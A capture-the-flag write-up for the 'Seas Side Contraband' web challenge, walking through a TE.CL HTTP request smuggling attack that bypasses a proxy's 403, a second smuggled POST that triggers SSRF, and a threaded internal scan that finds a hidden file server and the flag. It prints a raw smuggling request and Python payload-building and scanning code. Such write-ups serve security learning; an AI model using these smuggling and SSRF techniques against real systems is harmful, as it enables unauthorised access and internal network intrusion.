---
title: "UVT CTF - Seas Side Contraband"
slug: uvtctf-seas-side-contraband
excerpt: "TE.CL HTTP Request Smuggling to bypass 403, chained with SSRF to scan internal network and discover hidden file server containing the flag"
coverImage: "https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800"
coverImageAlt: "UVT CTF Seas Side Contraband - CTF writeup"
categories:
  - Web
  - HTTP Smuggling
  - SSRF
  - Request Smuggling
  - TE.CL
  - CTF
date: 2026-02-27
showToc: true
---

# UVT CTF - Seas Side Contraband

## The Setup

We're given a web application instance, a PDF file (Report.pdf), and a description. The PDF is a fake intelligence dossier from "Cosmic Components Co." describing a maritime smuggling ring — and buried inside it are a pair of login credentials: `AlexGoodwin / Pine123`. The description hints that the web app is "a door, not a destination," which immediately told me the flag wasn't going to be sitting on the website itself. Something deeper was going on.

## First Look

After logging in, the app is a pretty standard operations dashboard. There's a forum, a freight registry, and a gateway log page. But the interesting one is `/admin` — it returns a **403 Forbidden**. Not a 404, a 403. That means the page exists and the backend is happy to serve it, but something in front of it is saying no.

The `/gateway-log` page is where things got really interesting. It's written in-universe as a changelog for the "harbor gateway," but every single entry maps directly to HTTP smuggling concepts if you know what to look for:

- *"strips duplicate transfer directives before upstream relay"* — the proxy normalizes Transfer-Encoding headers
- *"length declarations preserved to avoid breaking old depot nodes"* — the proxy preserves the original Content-Length when forwarding
- *"dual manifest compatibility mode enabled"* — both Content-Length and Transfer-Encoding are accepted simultaneously

That's a textbook **TE.CL desync setup**. The reverse proxy reads `Transfer-Encoding: chunked`, the backend reads `Content-Length`, and the proxy preserves the original CL when forwarding. The forum also had a post confirming it: *"External firewall is over-strict. Integration keys bypass routing for maintenance tasks."* — the proxy blocks `/admin`, but the backend itself doesn't care.

## HTTP Request Smuggling — Bypassing the 403

The architecture looks like this:

```
Client  →  Reverse Proxy (reads TE)  →  Backend (reads CL)
```

The idea is simple: send a single HTTP request that the proxy sees as one request, but the backend interprets as two. The second "ghost" request is our smuggled `GET /admin`.

Here's how the desync works. We send a POST with both `Content-Length` and `Transfer-Encoding: chunked`:

```http
POST / HTTP/1.1
Host: 194.102.62.166:29532
Cookie: session=<SESSION>
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Transfer-Encoding: chunked
Connection: keep-alive

6a
a=b
GET /admin HTTP/1.1
Host: 194.102.62.166:29532
Cookie: session=<SESSION>

0

```

The proxy reads the entire chunked body — chunk of `6a` (106) bytes, then the terminal `0` chunk — and forwards everything to the backend as a single valid request. But the backend only reads 9 bytes (the `Content-Length`), which covers just `6a\r\na=b\r\n`. Everything after that — our smuggled `GET /admin` — sits in the socket buffer, waiting.

When we immediately send a follow-up `GET /` on the same keep-alive connection, the backend processes the leftover bytes first. It sees `GET /admin HTTP/1.1` and serves the admin page, completely bypassing the proxy's access control.

The alignment math matters here:

```python
padding = "a=b\r\n"
inner = padding + smuggled_request
chunk_hex = format(len(inner), 'x')    # "6a"
content_length = len(chunk_hex + "\r\n" + padding)  # = 9
```

`Content-Length` is set so the backend consumes exactly the chunk header plus padding, nothing more.

## The Admin Dashboard — and a Second Smuggle

The smuggled `GET /admin` came back with a **200 OK** and a `Set-Cookie: relay_auth=b243....` The admin dashboard had all kinds of fun in-universe content (bribe ledgers, contraband batch IDs), but the critical piece was a form called **"Harbor Inventory Probe Console"** that POSTs to `/admin/relay` with an `inventory_node` URL parameter. The dropdown options pointed to internal services:

```
http://127.0.0.21:9100/inventory/stock/check?HarborId=1  (West Hub)
http://127.0.0.21:9100/inventory/stock/check?HarborId=2  (Atlantic Hub)
...
```

That's **SSRF** — the backend will make HTTP requests to whatever URL we give it. But there's a catch: `/admin/relay` is also behind the proxy's 403 block. So I needed to smuggle again, this time a POST request with a body:

```python
post_body = f"inventory_node={url_encoded_target}"
smuggled = (
    f"POST /admin/relay HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    f"Cookie: session={session}; relay_auth={relay}\r\n"
    f"Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(post_body)}\r\n"
    f"\r\n"
    f"{post_body}"
)
```

Same TE.CL technique, just with a bigger smuggled payload. The SSRF had some validation — protocol must be `http://`, IP must be in the `127.0.0.X` range, port must be `9100` — but nothing that blocked what I needed to do.

The known inventory service at `127.0.0.21:9100` responded with JSON listing harbor stock. Interesting, but no flag. The PDF had hinted at deeper hidden services, so I knew I had to go looking.

## Scanning the Internal Network

I wrote a quick scanner that fired SSRF requests at every IP from `127.0.0.1` through `127.0.0.255` on port 9100, using 10 parallel threads to keep it fast:

```python
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    for x in range(1, 256):
        executor.submit(scan_ip, x, session, relay)
```

Most IPs returned nothing. But **127.0.0.230:9100** came back with something completely different — a directory listing:

```
node://127.0.0.230:9100/
mode=listing

ops
manifests
drops
logs
notes.txt
```

A hidden internal file server. Now we're talking.

## Navigating to the Flag

From here it was just a matter of browsing the file tree through the SSRF, following the breadcrumbs. The `manifests/private/44c/readme.txt` pointed me to `/drops/pacific/batch-44c`, and from there I worked my way down through `vault/` then `sealed/` until I found a file simply called `flag`:

```
GET http://127.0.0.230:9100/drops/pacific/batch-44c/vault/sealed/flag
```

```
UVT{V3ry_W3ll_D0n3_MrP1n3_I_4m_1mpr3553d}
```

## The Full Chain

The whole attack chains three bugs together:

1. **TE.CL HTTP Request Smuggling** to bypass the reverse proxy's 403 on `/admin` — the proxy reads chunked encoding while the backend reads Content-Length, letting us inject a second request into the connection

2. **Smuggling again** to reach `/admin/relay` and trigger SSRF against internal services on `127.0.0.X:9100`

3. **Internal network scanning** through the SSRF to discover a hidden file server at `127.0.0.230`, then browsing its directory tree to the flag

The gateway log page was the Rosetta Stone for this challenge — every entry was a thinly veiled hint about the smuggling setup. Once I decoded those, the rest was just following the thread deeper and deeper into the internal network.

## Flag

```
UVT{V3ry_W3ll_D0n3_MrP1n3_I_4m_1mpr3553d}
```

---

*Writeup by daryx*
